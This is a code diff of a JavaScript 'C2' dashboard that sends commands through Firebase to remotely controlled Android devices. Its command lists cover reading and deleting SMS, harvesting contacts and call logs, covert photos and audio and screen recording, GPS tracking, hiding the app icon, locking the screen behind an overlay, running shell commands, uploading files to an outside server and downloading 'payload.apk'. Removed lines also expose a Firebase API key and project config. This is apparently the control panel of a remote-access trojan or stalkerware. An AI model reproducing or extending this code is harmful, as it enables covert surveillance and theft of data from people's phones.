-            { icon: '🔘', name: 'Click', action: 'click', params: { x: '500', y: '1000' } },
-            { icon: '⌨️', name: 'Type Text', action: 'type_text', params: { text: 'Hello from C2' } },
-            { icon: '🔄', name: 'Swipe', action: 'swipe', params: { x1: '300', y1: '800', x2: '300', y2: '200' } },
-            { icon: '🔒', name: 'Lock Screen', action: 'lock_screen' },
-            { icon: '💡', name: 'Flashlight', action: 'toggle_flashlight', params: { state: 'on' } },
-            { icon: '🔔', name: 'Notification', action: 'notify', params: { title: 'MyControl', body: 'Command received' } },
-            { icon: '💻', name: 'Device Info', action: 'get_device_info' },
-            { icon: '🔋', name: 'Battery Info', action: 'get_battery_info' },
-            { icon: '📶', name: 'Network Info', action: 'get_network_info' },
-            { icon: '🔆', name: 'Set Brightness', action: 'set_brightness', params: { level: '128' } },
-            { icon: '📱', name: 'Find Phone', action: 'find_phone' },
-            { icon: '🌅', name: 'Wake Screen', action: 'wake_screen' },
-            { icon: '🔇', name: 'Mute', action: 'mute' },
+            { name: 'Get Device Info', action: 'get_device_info', icon: 'ℹ️', params: {} },
+            { name: 'Get Installed Apps', action: 'get_installed_apps', icon: '📦', params: {} },
+            { name: 'Get Call Log', action: 'get_call_log', icon: '📞', params: { limit: '50' }, hasLimit: true },
+            { name: 'Open App', action: 'open_app', icon: '🚀', params: { packageName: '' }, isOpenApp: true },
+            { name: 'Take Screenshot', action: 'take_screenshot', icon: '📸', params: {} },
+            { name: 'Show Toast', action: 'show_toast', icon: '💬', params: { message: 'Hello from C2!' } },
+            { name: 'Vibrate', action: 'vibrate', icon: '📳', params: { duration_ms: '3000' } },
         ],
-        media: [
-            { icon: '🎤', name: 'Record Audio', action: 'record_audio', params: { duration: '15' } },
-            { icon: '📹', name: 'Record Screen', action: 'record_screen', params: { duration: '30' } },
-            { icon: '📸', name: 'Take Photo', action: 'take_photo' },
-            { icon: '📢', name: 'Play Sound', action: 'play_sound', params: { url: 'https://example.com/alert.mp3' } },
-            { icon: '🔊', name: 'Set Volume', action: 'set_volume', params: { level: '80', stream: 'media' } },
-            { icon: '🔇', name: 'Ringer Mode', action: 'set_ringer_mode', params: { mode: 'silent' } },
-            { icon: '💡', name: 'Flashlight Off', action: 'toggle_flashlight', params: { state: 'off' } },
+
+        // ── SMS ──
+        sms: [
+            { name: 'Send SMS', action: 'send_sms', icon: '✉️', params: { phone: '', message: '' } },
+            { name: 'Get SMS Inbox', action: 'get_sms_inbox', icon: '📥', params: { limit: '20' }, hasLimit: true },
+            { name: 'Get SMS Threads', action: 'get_sms_threads', icon: '💬', params: {} },
+            { name: 'Delete SMS', action: 'delete_sms', icon: '🗑️', params: { thread_id: '' } },
         ],
-        files: [
-            { icon: '📸', name: 'Screenshot', action: 'take_screenshot' },
-            { icon: '📋', name: 'Clipboard Get', action: 'clipboard_get' },
-            { icon: '📋', name: 'Clipboard Set', action: 'clipboard_set', params: { text: 'pasted from C2' } },
-            { icon: '📁', name: 'List Files', action: 'list_directory', params: { path: '/sdcard/Download' } },
-            { icon: '📄', name: 'Read File', action: 'read_file', params: { path: '/sdcard/Download/notes.txt' } },
-            { icon: '⬆️', name: 'Upload File', action: 'upload_file', params: { url: 'https://your-server.com/upload', path: '/sdcard/DCIM/photo.jpg' } },
-            { icon: '📦', name: 'Download File', action: 'download_file', params: { url: 'https://example.com/payload.apk', path: '/sdcard/Download/payload.apk' } },
+
+        // ── PHONE ──
+        phone: [
+            { name: 'Get Contacts', action: 'get_contacts', icon: '👤', params: {} },
+            { name: 'Make Call', action: 'make_call', icon: '📞', params: { phone: '' } },
         ],
-        admin: [
-            { icon: '💻', name: 'Run Shell', action: 'run_shell', params: { command: 'id' } },
-            { icon: '📊', name: 'Running Apps', action: 'get_running_apps' },
-            { icon: '🗑️', name: 'Kill Process', action: 'kill', params: { pid: '1234' } },
-            { icon: '📡', name: 'Ping', action: 'ping' },
-            { icon: '🌐', name: 'Open URL', action: 'open_url', params: { url: 'https://example.com' } },
-            { icon: '📞', name: 'Start Call', action: 'start_call', params: { number: '+1234567890' }, simSlot: true },
-            { icon: '💬', name: 'Send SMS', action: 'send_sms', params: { to: '+1234567890', text: 'Hello' }, simSlot: true },
-            { icon: '📋', name: 'List SMS', action: 'list_sms', params: { folder: 'inbox' } },
-            { icon: '🗑️', name: 'Delete SMS', action: 'delete_sms', params: { id: '123' } },
-            { icon: '💬', name: 'SMS Threads', action: 'get_sms_threads' },
-            { icon: '📞', name: 'List SIMs', action: 'list_sims' },
-            { icon: '👤', name: 'Contacts', action: 'get_contacts' },
-            { icon: '📜', name: 'Call Log', action: 'get_call_log' },
-            { icon: '📱', name: 'Installed Apps', action: 'get_installed_apps' },
-            { icon: '👥', name: 'Accounts', action: 'get_accounts' },
-            { icon: '📶', name: 'Hotspot On', action: 'enable_hotspot' },
-            { icon: '📶', name: 'Hotspot Off', action: 'disable_hotspot' },
-            { icon: '💬', name: 'Show Message', action: 'show_message', params: { text: 'Hello from C2' } },
-            { icon: '❄️', name: 'Freeze', action: 'freeze', params: { text: 'Device locked by admin' } },
-            { icon: '🔥', name: 'Unfreeze', action: 'unfreeze' },
-            { icon: '✏️', name: 'Update Overlay', action: 'update_overlay', params: { text: 'New message' } },
-            { icon: '🙈', name: 'Hide App Icon', action: 'hide_app' },
-            { icon: '👁️', name: 'Show App Icon', action: 'show_app' },
-            { icon: '🗺️', name: 'Open Maps', action: 'open_maps', params: { lat: '40.7128', lng: '-74.0060' } },
+
+        // ── CAMERA & FLASHLIGHT (MERGED) ──
+        camera: [
+            { name: 'Take Photo', action: 'take_photo', icon: '📷', params: {}, isCamera: true },
+            { name: 'Flashlight', action: 'flashlight', icon: '🔦', params: {}, isToggle: true },
         ],
-        loc: [
-            { icon: '📍', name: 'GPS Once', action: 'get_location' },
-            { icon: '🔄', name: 'GPS Tracking', action: 'start_tracking', params: { interval_ms: '5000' } },
-            { icon: '⏹️', name: 'Stop Tracking', action: 'stop_tracking' },
-            { icon: '📡', name: 'Cell Towers', action: 'get_cell_towers' },
-            { icon: '📶', name: 'WiFi Networks', action: 'get_wifi_networks' },
-            { icon: '🔋', name: 'Battery', action: 'get_battery_info' },
-            { icon: '📱', name: 'Device Info', action: 'get_device_info' },
-            { icon: '📊', name: 'Sensor Data', action: 'get_sensors' },
-            { icon: '🌐', name: 'Network Info', action: 'get_network_info' },
+
+        // ── LOCATION & SENSORS (MERGED) ──
+        location: [
+            { name: 'Get Location (GPS Once)', action: 'get_location', icon: '📍', params: {} },
+            { name: 'Start GPS Tracking', action: 'start_gps_tracking', icon: '🔄', params: { interval_ms: '10000' } },
+            { name: 'Stop GPS Tracking', action: 'stop_gps_tracking', icon: '⏹️', params: {} },
+        ],
+
+        // ── SYSTEM ──
+        system: [
+            { name: 'Show/Hide App', action: 'show_hide_app', icon: '👁️', params: {}, isHideShow: true },
+            { name: 'Lock Screen', action: 'lock_screen', icon: '🔒', params: {} },
+            { name: 'Reboot Device', action: 'reboot', icon: '🔁', params: {} },
+            { name: 'Set Volume', action: 'set_volume', icon: '🔊', params: { level: '50' } },
+            { name: 'Get Clipboard', action: 'get_clipboard', icon: '📋', params: {} },
+        ],
+
+        // ── NETWORK ──
+        network: [
+            { name: 'Get WiFi Networks', action: 'get_wifi_networks', icon: '📶', params: {} },
+            { name: 'Get Network Info', action: 'get_network_info', icon: '🌐', params: {} },
+            { name: 'Enable Hotspot', action: 'enable_hotspot', icon: '📡', params: { ssid: 'MyControl_AP', password: '12345678' } },
+            { name: 'Disable Hotspot', action: 'disable_hotspot', icon: '📡', params: {} },
         ]
     };
 
@@ -626,231 +616,76 @@
         loadingDevices: false,
         contextDeviceId: null,
         pendingModalCmd: null,
-        deviceUnsubscribe: null,
         resultUnsub: null,
-        writeStatus: 'ready',
     };
 
-    let firebaseInitialized = false;
-    let app = null;
     let db = null;
-    let auth = null;
+    let firebaseInitialized = false;
     let pingTimer = null;
-    let pingCount = 0;
 
     // ═══════════════════════════════════════════════════════
-    //  FIREBASE CONFIG
+    //  FIREBASE INIT
     // ═══════════════════════════════════════════════════════
     function getConfig() {
-        const stored = localStorage.getItem('mc_firebase_config');
-        if (stored) {
-            try {
-                const parsed = JSON.parse(stored);
-                if (parsed.apiKey && parsed.projectId) return parsed;
-            } catch(e) {}
-        }
+        try {
+            const saved = localStorage.getItem('mc_firebase_config');
+            if (saved) return JSON.parse(saved);
+        } catch (e) {}
         return {
-            apiKey: "AIzaSyCbb-g6DhyCUjAcmglnkj-B3NLoI2KnL8o",
-            authDomain: "control-f5136.firebaseapp.com",
-            projectId: "control-f5136",
-            storageBucket: "control-f5136.firebasestorage.app",
-            messagingSenderId: "204625008820",
-            appId: "1:204625008820:web:2802cd55ea8f327e6a9fe1"
+            apiKey: 'AIzaSyDEFAULT',
+            authDomain: 'control-f5136.firebaseapp.com',
+            projectId: 'control-f5136',
+            storageBucket: 'control-f5136.appspot.com',
+            messagingSenderId: '123456789',
+            appId: '1:123456789:web:abc123'
         };
     }
 
-    // ═══════════════════════════════════════════════════════
-    //  INIT
-    // ═══════════════════════════════════════════════════════
-    document.addEventListener('DOMContentLoaded', () => {
-        appendDiag('DOM ready. Initializing Firebase with Web App config…');
-        initFirebase();
-    });
-
     function initFirebase() {
         const cfg = getConfig();
-        appendDiag('Config: project=' + cfg.projectId + ', apiKey=' + cfg.apiKey.slice(0, 10) + '…');
-
+        if (!cfg.apiKey || cfg.apiKey === 'AIzaSyDEFAULT' || !cfg.projectId) {
+            appendDiag('⚠️ No Firebase config found. Open ⚙️ Settings to configure.');
+            document.getElementById('dashConnStatus').textContent = '⚠️ Not configured';
+            document.getElementById('dashConnStatus').style.color = '#f87171';
+            return;
+        }
         try {
-            app = firebase.initializeApp(cfg);
-            db = app.firestore();
-            auth = app.auth();
+            firebase.initializeApp(cfg);
+            db = firebase.firestore();
             db.settings({ merge: true });
-
-            appendDiag('Firebase SDK initialized');
-
-            const authTimeout = setTimeout(() => {
-                appendDiag('⏱️ Auth timed out after 15s');
-                document.getElementById('sidebarStatus').innerHTML = '❌ timeout';
-                setFirebaseStatus('error', 'Anonymous auth timed out');
-                document.getElementById('deviceListContainer').innerHTML = `
-                    <div class="empty-state">
-                        <div class="big-icon">⏱️</div>
-                        <h3>Authentication Timed Out</h3>
-                        <p>Firebase didn't respond in 15 seconds.</p>
-                        <p class="sub">Make sure <b>Anonymous Sign-in</b> is enabled in Firebase Console → Authentication → Sign-in methods</p>
-                        <div style="margin-top:16px;display:flex;gap:10px;justify-content:center;">
-                            <button class="btn btn-primary" onclick="openSettings()">⚙️ Config</button>
-                            <button class="btn btn-ghost" onclick="location.reload()">⟳ Retry</button>
-                        </div>
-                    </div>
-                `;
-            }, 15000);
-
-            auth.signInAnonymously()
-                .then(userCred => {
-                    clearTimeout(authTimeout);
-                    firebaseInitialized = true;
-                    appendDiag('✅ Authenticated! UID: ' + userCred.user.uid);
-                    document.getElementById('sidebarStatus').innerHTML = '✅ connected';
-                    document.getElementById('sidebarAuth').textContent = 'UID: ' + userCred.user.uid.slice(0, 16) + '…';
-                    setFirebaseStatus('ok', 'online');
-                    updateStats();
-                    startDeviceListener();
-                    setTimeout(pingOfflineDevices, 2000);
-                })
-                .catch(err => {
-                    clearTimeout(authTimeout);
-                    appendDiag('❌ Auth error: ' + err.code + ' — ' + err.message);
-                    document.getElementById('sidebarStatus').innerHTML = '❌ ' + err.code;
-                    document.getElementById('sidebarAuth').textContent = err.message;
-                    setFirebaseStatus('error', err.message);
-                    let tip = '';
-                    if (err.code === 'auth/operation-not-allowed') {
-                        tip = 'Go to Firebase Console → Authentication → Sign-in methods → Enable <b>Anonymous</b>';
-                    } else if (err.code === 'auth/api-key-not-valid' || err.code === 'auth/invalid-api-key') {
-                        tip = 'API key rejected. Make sure you\'re using the <b>Web App API key</b> (not the Android one). Open ⚙️ Config to check.';
-                    } else {
-                        tip = 'Check Firebase Console and your config. Click ⚙️ Config to edit.';
-                    }
-                    document.getElementById('deviceListContainer').innerHTML = `
-                        <div class="empty-state">
-                            <div class="big-icon">🚫</div>
-                            <h3>Authentication Failed</h3>
-                            <p><code>${err.code}</code>: ${escapeHtml(err.message)}</p>
-                            <p class="sub" style="margin-top:12px;">${tip}</p>
-                            <div style="margin-top:16px;display:flex;gap:10px;justify-content:center;">
-                                <button class="btn btn-primary" onclick="openSettings()">⚙️ Config</button>
-                                <button class="btn btn-ghost" onclick="location.reload()">⟳ Retry</button>
-                            </div>
-                        </div>
-                    `;
-                });
-
+            firebaseInitialized = true;
+            document.getElementById('dashConnStatus').textContent = '✅ Connected';
+            document.getElementById('dashConnStatus').style.color = '#34d399';
+            appendDiag('✅ Firebase initialized: ' + cfg.projectId);
+            refreshDevices();
         } catch (e) {
-            appendDiag('❌ Init error: ' + e.message);
-            setFirebaseStatus('error', 'Init: ' + e.message);
+            document.getElementById('dashConnStatus').textContent = '❌ ' + e.message;
+            document.getElementById('dashConnStatus').style.color = '#f87171';
+            appendDiag('❌ Firebase init error: ' + e.message);
         }
     }
 
+    // ═══════════════════════════════════════════════════════
+    //  DIAGNOSTICS
+    // ═══════════════════════════════════════════════════════
     function appendDiag(msg) {
-        const dbg = document.getElementById('diagnosticBox');
-        dbg.style.display = 'block';
-        dbg.innerHTML += '[' + new Date().toLocaleTimeString() + '] ' + msg + '\n';
-        dbg.scrollTop = dbg.scrollHeight;
-        console.log('[MyControl] ' + msg);
+        const panel = document.getElementById('diagPanel');
+        const line = document.createElement('div');
+        line.className = 'diag-line';
+        line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+        panel.appendChild(line);
+        while (panel.children.length > 50) panel.removeChild(panel.firstChild);
+        panel.scrollTop = panel.scrollHeight;
     }
-
-    function setFirebaseStatus(type, msg) {
-        const el = document.getElementById('dashFirebaseStatus');
-        if (type === 'ok') { el.innerHTML = '✅ ' + msg; el.style.color = '#34d399'; }
-        else if (type === 'error') { el.innerHTML = '❌ ' + msg; el.style.color = '#f87171'; }
-        else { el.innerHTML = '<span class="loading-spinner" style="width:12px;height:12px;border-width:2px;vertical-align:middle;margin-right:6px;"></span> ' + msg; el.style.color = '#fbbf24'; }
-    }
-
-    function setWriteStatus(type, msg) {
-        const el = document.getElementById('dashWriteStatus');
-        if (type === 'ready') { el.textContent = '✅ ' + msg; el.className = 'value green'; }
-        else if (type === 'writing') { el.innerHTML = '<span class="loading-spinner" style="width:14px;height:14px;border-width:2px;vertical-align:middle;margin-right:4px;"></span> ' + msg; el.className = 'value yellow'; }
-        else if (type === 'error') { el.textContent = '❌ ' + msg; el.className = 'value red'; }
+    function toggleDiag() {
+        document.getElementById('diagPanel').classList.toggle('open');
     }
 
     // ═══════════════════════════════════════════════════════
-    //  AUTO-PING — with write confirmation
+    //  DASHBOARD
     // ═══════════════════════════════════════════════════════
-    async function pingOfflineDevices() {
-        if (!firebaseInitialized || !db || state.devices.length === 0) return;
-        const now = Date.now();
-        let pinged = 0;
-        for (const d of state.devices) {
-            const lastSeen = d.lastSeen || 0;
-            const age = now - lastSeen;
-            if (age > 30000 && age < 600000) {
-                const cmdId = now + '_' + Math.random().toString(36).slice(2, 8) + '_ping';
-                try {
-                    await db.collection('commands').doc(cmdId).set({
-                        deviceId: d.id, action: 'ping', params: {}, createdAt: Date.now()
-                    });
-                    pinged++;
-                } catch (e) {
-                    appendDiag(`⚠️ Ping write failed for ${d.id.slice(0,8)}: ${e.message}`);
-                }
-            }
-        }
-        pingCount += pinged;
-        if (pinged > 0) appendDiag(`⚡ Pinged ${pinged} device(s) to wake up`);
-        const pingEl = document.getElementById('dashPingStatus');
-        if (pingEl) pingEl.textContent = pinged > 0 ? `Pinging ${pinged}…` : 'Watching';
-        const sidebarPing = document.getElementById('sidebarPingStatus');
-        if (sidebarPing) sidebarPing.textContent = `Pings sent: ${pingCount}`;
-    }
-
-    // ═══════════════════════════════════════════════════════
-    //  DEVICE LISTENER
-    // ═══════════════════════════════════════════════════════
-    function startDeviceListener() {
-        state.loadingDevices = true;
-        renderDeviceList();
-        if (state.deviceUnsubscribe) state.deviceUnsubscribe();
-
-        appendDiag('Starting real-time listener on devices/ …');
-
-        state.deviceUnsubscribe = db.collection('devices')
-            .onSnapshot(snapshot => {
-                state.loadingDevices = false;
-                state.devices = [];
-                snapshot.forEach(doc => { state.devices.push({ id: doc.id, ...doc.data() }); });
-                appendDiag('📡 Snapshot: ' + state.devices.length + ' devices');
-                state.devices.sort((a, b) => {
-                    const aOn = isOnline(a); const bOn = isOnline(b);
-                    if (aOn !== bOn) return aOn ? -1 : 1;
-                    return (a.id).localeCompare(b.id);
-                });
-                renderDeviceList();
-                updateStats();
-                document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
-                pingOfflineDevices();
-            }, err => {
-                state.loadingDevices = false;
-                appendDiag('❌ Snapshot error: ' + err.message);
-                toast('Firestore error: ' + err.message, 'error');
-                setTimeout(() => fallbackGetDevices(), 1000);
-            });
-    }
-
-    async function fallbackGetDevices() {
-        try {
-            appendDiag('Falling back to .get() …');
-            const snap = await db.collection('devices').get();
-            state.devices = [];
-            snap.forEach(doc => { state.devices.push({ id: doc.id, ...doc.data() }); });
-            appendDiag('✅ .get() returned ' + state.devices.length + ' devices');
-            state.devices.sort((a, b) => {
-                const aOn = isOnline(a); const bOn = isOnline(b);
-                if (aOn !== bOn) return aOn ? -1 : 1;
-                return (a.id).localeCompare(b.id);
-            });
-            renderDeviceList();
-            updateStats();
-            document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
-        } catch (e) {
-            appendDiag('❌ Fallback failed: ' + e.message);
-            toast('Cannot read devices: ' + e.message, 'error');
-        }
-    }
-
     async function refreshDevices() {
-        if (!firebaseInitialized || !db) { toast('Not connected. ⚙️ Config to retry.', 'error'); return; }
+        if (!firebaseInitialized || !db) { toast('Firebase not connected', 'error'); return; }
         state.loadingDevices = true;
         renderDeviceList();
         toast('Refreshing…', 'info');
@@ -921,6 +756,27 @@
         document.getElementById('dashLastUpdated').textContent = 'Online: ' + online + '/' + total + ' | Updated: ' + new Date().toLocaleTimeString();
     }
 
+    async function pingOfflineDevices() {
+        if (!firebaseInitialized || !db) return;
+        state.devices.forEach(d => {
+            if (!isOnline(d)) {
+                db.collection('devices').doc(d.id).get().then(snap => {
+                    if (snap.exists) {
+                        const data = snap.data();
+                        if (data.lastSeen && (Date.now() - data.lastSeen) < 120000) {
+                            const idx = state.devices.findIndex(x => x.id === d.id);
+                            if (idx !== -1) {
+                                state.devices[idx] = { id: d.id, ...data };
+                                renderDeviceList();
+                                updateStats();
+                            }
+                        }
+                    }
+                }).catch(() => {});
+            }
+        });
+    }
+
     // ═══════════════════════════════════════════════════════
     //  TAP vs LONG-PRESS
     // ═══════════════════════════════════════════════════════
@@ -988,7 +844,6 @@
         const idx = name === 'dashboard' ? 0 : 1;
         document.querySelectorAll('.sidebar-nav a')[idx]?.classList.add('active');
 
-        // Clean up result listener when leaving command view
         if (name !== 'command' && state.resultUnsub) {
             state.resultUnsub();
             state.resultUnsub = null;
@@ -1006,28 +861,20 @@
 
     // ═══════════════════════════════════════════════════════
     //  PERSISTENT PENDING COMMAND TRACKER
-    //  When entering Command Center, check for results that
-    //  were written while we were away (device was offline
-    //  when command was sent but came online later).
     // ═══════════════════════════════════════════════════════
     async function loadPendingResultsForDevice(deviceId) {
         if (!db || !firebaseInitialized) return;
         appendDiag(`🔍 Checking for pending results for ${deviceId.slice(0,8)}…`);
         try {
-            // Query commands sent TO this device
             const cmdSnapshot = await db.collection('commands')
                 .whereEqualTo('deviceId', deviceId)
                 .get();
 
-            // Query results written BY this device
-            const resultSnapshot = await db.collection('results')
-                .get();
+            const resultSnapshot = await db.collection('results').get();
 
-            // Build lookup of result doc IDs
             const resultIds = new Set();
             resultSnapshot.forEach(doc => resultIds.add(doc.id));
 
-            // For each pending command, check if result exists
             cmdSnapshot.forEach(doc => {
                 const cmdId = doc.id;
                 const cmdData = doc.data();
@@ -1036,7 +883,6 @@
                 if (alreadyShown) return;
 
                 if (resultIds.has(cmdId)) {
-                    // Result already written — add to our display
                     const resultDoc = resultSnapshot.docs.find(d => d.id === cmdId);
                     if (resultDoc) {
                         const rd = resultDoc.data();
@@ -1051,7 +897,6 @@
                         });
                     }
                 } else {
-                    // Command still pending — the device hasn't picked it up yet
                     state.results.unshift({
                         id: cmdId,
                         action: action,
@@ -1086,14 +931,12 @@
         if (!db || !firebaseInitialized) return;
         if (state.resultUnsub) state.resultUnsub();
 
-        // Listen to ALL new results being created in the results collection
         state.resultUnsub = db.collection('results')
             .onSnapshot(snapshot => {
                 snapshot.docChanges().forEach(change => {
                     if (change.type === 'added') {
                         const docId = change.doc.id;
                         const data = change.doc.data();
-                        // Check if this result matches a command we sent
                         const existing = state.results.find(r => r.id === docId);
                         if (existing && (existing.status === 'sent' || existing.status === 'pending')) {
                             updateCmdResult(docId, data.status || 'error', data.output || '—');
@@ -1120,8 +963,7 @@
         renderCmdResults();
         showView('command');
         toast('Controlling: ' + deviceId.slice(0, 12) + '…', 'info');
-        
-        // Load results from Firestore that were written while away
+
         setTimeout(() => {
             loadPendingResultsForDevice(deviceId);
             startResultListenerForDevice(deviceId);
@@ -1129,7 +971,7 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  COMMAND CENTER — WITH PROPER STATUS TRACKING
+    //  COMMAND CENTER
     // ═══════════════════════════════════════════════════════
     function renderCmdCategories(activeCat) {
         const grid = document.getElementById('commandGrid');
@@ -1144,9 +986,9 @@
         tabs += '<div class="section-title"><h3>' + CAT_NAMES[activeCat] + '</h3><span class="badge">' + cmds.length + '</span></div>';
         let cards = '<div class="cmd-grid">';
         cmds.forEach(cmd => {
-            const hp = cmd.params && Object.keys(cmd.params).length > 0;
-            const hasSim = cmd.simSlot === true;
-            cards += '<div class="cmd-card"><div class="cmd-dot ' + ((hp || hasSim) ? 'has-params' : '') + '"></div><div class="cmd-icon">' + cmd.icon + '</div><div class="cmd-name">' + cmd.name + '</div></div>';
+            const hasParams = cmd.params && Object.keys(cmd.params).length > 0;
+            const hasSpecial = cmd.isToggle || cmd.isCamera || cmd.isHideShow || cmd.isOpenApp || cmd.hasLimit;
+            cards += '<div class="cmd-card"><div class="cmd-dot ' + ((hasParams || hasSpecial) ? 'has-params' : '') + '"></div><div class="cmd-icon">' + cmd.icon + '</div><div class="cmd-name">' + cmd.name + '</div></div>';
         });
         cards += '</div>';
         grid.innerHTML = tabs + cards;
@@ -1154,9 +996,12 @@
             const cmd = cmds[i];
             if (!cmd) return;
             el.addEventListener('click', () => {
-                const hp = cmd.params && Object.keys(cmd.params).length > 0;
-                if (hp || cmd.simSlot) showParamModal(cmd);
-                else executeCmd(cmd, {});
+                const hasParams = cmd.params && Object.keys(cmd.params).length > 0;
+                if (hasParams || cmd.isToggle || cmd.isCamera || cmd.isHideShow || cmd.isOpenApp || cmd.hasLimit) {
+                    showParamModal(cmd);
+                } else {
+                    executeCmd(cmd, {});
+                }
             });
         });
     }
@@ -1165,10 +1010,55 @@
         const modal = document.getElementById('paramModal');
         document.getElementById('modalTitle').textContent = cmd.icon + ' ' + cmd.name;
         document.getElementById('modalSub').textContent = 'Action: ' + cmd.action;
+
         const fields = document.getElementById('modalFields');
         fields.innerHTML = '';
-        if (cmd.params) {
+
+        // Hide all special selectors first
+        document.getElementById('modalToggleSelector').style.display = 'none';
+        document.getElementById('modalCameraSelector').style.display = 'none';
+        document.getElementById('modalHideShowSelector').style.display = 'none';
+        document.getElementById('modalSimSelector').style.display = 'none';
+        document.getElementById('modalLimitField').style.display = 'none';
+
+        // Handle special command types
+        if (cmd.isToggle) {
+            // Flashlight on/off
+            document.getElementById('modalToggleSelector').style.display = 'block';
+            const sel = document.getElementById('toggleSelect');
+            sel.innerHTML = '<option value="on">Turn On</option><option value="off">Turn Off</option>';
+        }
+
+        if (cmd.isCamera) {
+            document.getElementById('modalCameraSelector').style.display = 'block';
+        }
+
+        if (cmd.isHideShow) {
+            document.getElementById('modalHideShowSelector').style.display = 'block';
+        }
+
+        if (cmd.hasLimit) {
+            document.getElementById('modalLimitField').style.display = 'block';
+            document.getElementById('limitInput').value = cmd.params?.limit || '50';
+        }
+
+        if (cmd.isOpenApp) {
+            // Show package name input
+            const label = document.createElement('label');
+            label.textContent = 'Package Name';
+            const input = document.createElement('input');
+            input.id = 'modal_param_packageName';
+            input.value = cmd.params?.packageName || '';
+            input.placeholder = 'e.g. com.android.chrome';
+            input.dataset.paramKey = 'packageName';
+            fields.appendChild(label);
+            fields.appendChild(input);
+        }
+
+        // Render regular params
+        if (cmd.params && !cmd.isOpenApp) {
             Object.entries(cmd.params).forEach(([key, val]) => {
+                if (key === 'limit' && cmd.hasLimit) return; // handled by limit field
                 const label = document.createElement('label');
                 label.textContent = key;
                 const input = document.createElement('input');
@@ -1179,88 +1069,114 @@
                 fields.appendChild(input);
             });
         }
-        const simSelector = document.getElementById('modalSimSelector');
-        if (cmd.simSlot) {
-            simSelector.style.display = 'block';
-        } else {
-            simSelector.style.display = 'none';
-        }
 
         state.pendingModalCmd = cmd;
         modal.classList.add('open');
     }
 
-    function closeParamModal() { document.getElementById('paramModal').classList.remove('open'); state.pendingModalCmd = null; }
+    function closeParamModal() {
+        document.getElementById('paramModal').classList.remove('open');
+        state.pendingModalCmd = null;
+    }
 
-    function executeFromModal() {
+    function onModalConfirm() {
         const cmd = state.pendingModalCmd;
         if (!cmd) return;
+
         const params = {};
-        document.querySelectorAll('#modalFields input').forEach(inp => { params[inp.dataset.paramKey] = inp.value; });
-        const simSelector = document.getElementById('modalSimSelector');
-        if (simSelector.style.display !== 'none') {
-            const simVal = document.getElementById('simSlotSelect').value;
-            if (simVal) {
-                params.sim_slot = simVal;
-                params.sim = simVal;
-            }
+
+        // Collect regular params from fields
+        document.querySelectorAll('#modalFields input').forEach(inp => {
+            params[inp.dataset.paramKey] = inp.value;
+        });
+
+        // Handle flashlight toggle
+        if (cmd.isToggle) {
+            const val = document.getElementById('toggleSelect').value;
+            params.action = val; // 'on' or 'off'
         }
+
+        // Handle camera front/back
+        if (cmd.isCamera) {
+            params.camera = document.getElementById('cameraSelect').value;
+        }
+
+        // Handle show/hide app
+        if (cmd.isHideShow) {
+            params.action = document.getElementById('hideShowSelect').value;
+        }
+
+        // Handle limit
+        if (cmd.hasLimit) {
+            const limitVal = document.getElementById('limitInput').value;
+            if (limitVal) params.limit = limitVal;
+        }
+
         closeParamModal();
         executeCmd(cmd, params);
     }
 
-    document.getElementById('paramModal').addEventListener('click', function(e) { if (e.target === this) closeParamModal(); });
-    document.getElementById('deleteModal').addEventListener('click', function(e) { if (e.target === this) closeDeleteModal(); });
+    document.getElementById('paramModal').addEventListener('click', function(e) {
+        if (e.target === this) closeParamModal();
+    });
+    document.getElementById('deleteModal').addEventListener('click', function(e) {
+        if (e.target === this) closeDeleteModal();
+    });
+    document.getElementById('settingsModal').addEventListener('click', function(e) {
+        if (e.target === this) closeSettings();
+    });
 
     async function executeCmd(cmd, params) {
         const deviceId = state.selectedDeviceId;
-        if (!deviceId || !firebaseInitialized || !db) { toast('No device selected or not connected', 'error'); return; }
-        
+        if (!deviceId || !firebaseInitialized || !db) {
+            toast('No device selected or not connected', 'error');
+            return;
+        }
+
         const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
         const now = new Date().toLocaleTimeString();
         const actionLabel = cmd.name || cmd.action;
-        
-        // === PHASE 1: show "sending" ===
-        state.results.unshift({ 
-            id: cmdId, 
-            action: cmd.action, 
-            name: actionLabel, 
-            status: 'sending', 
-            output: 'Writing to Firestore…', 
+
+        // Show sending state
+        state.results.unshift({
+            id: cmdId,
+            action: cmd.action,
+            name: actionLabel,
+            status: 'sending',
+            output: 'Writing to Firestore…',
             time: now,
             params: params
         });
         renderCmdResults();
         setWriteStatus('writing', 'writing command…');
 
-        // === PHASE 2: write to Firestore with await for confirmation ===
+        // Write to Firestore
         try {
             const docRef = db.collection('commands').doc(cmdId);
-            await docRef.set({ 
-                deviceId: deviceId, 
-                action: cmd.action, 
-                params: params, 
-                createdAt: Date.now() 
+            await docRef.set({
+                deviceId: deviceId,
+                action: cmd.action,
+                params: params,
+                createdAt: Date.now()
             });
-            // Write succeeded — update to "sent"
+
             updateCmdResult(cmdId, 'sent', 'Command written to Firestore. Waiting for device to execute…');
             toast('→ ' + actionLabel + ' written to server', 'info');
             setWriteStatus('ready', 'Write OK');
             state.commandsSent++;
             document.getElementById('cmdCountDisplay').textContent = state.commandsSent;
 
-            // === PHASE 3: listen for result with timeout ===
+            // Listen for result with 30s timeout
             const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
                 if (snap.exists) {
                     const d = snap.data();
                     updateCmdResult(cmdId, d.status || 'error', d.output || '—');
                     unsub();
-                    toast(d.status === 'ok' ? '✓ ' + actionLabel : '✗ ' + actionLabel, 
+                    toast(d.status === 'ok' ? '✓ ' + actionLabel : '✗ ' + actionLabel,
                           d.status === 'ok' ? 'success' : 'error');
                 }
             });
-            setTimeout(() => { 
-                // Check if still pending — mark as timeout
+            setTimeout(() => {
                 const found = state.results.find(r => r.id === cmdId);
                 if (found && (found.status === 'sent' || found.status === 'pending')) {
                     updateCmdResult(cmdId, 'pending', '⏱️ Device did not respond in 30s. Result will appear when device comes online.');
@@ -1270,18 +1186,25 @@
             }, 30000);
 
         } catch (e) {
-            // Write FAILED
             updateCmdResult(cmdId, 'write_fail', '❌ Firestore write failed: ' + e.message);
             toast('Write failed: ' + e.message, 'error');
             setWriteStatus('error', 'Write failed: ' + e.message);
         }
     }
 
+    function setWriteStatus(state, msg) {
+        const el = document.getElementById('cmdLastStatus');
+        el.textContent = msg;
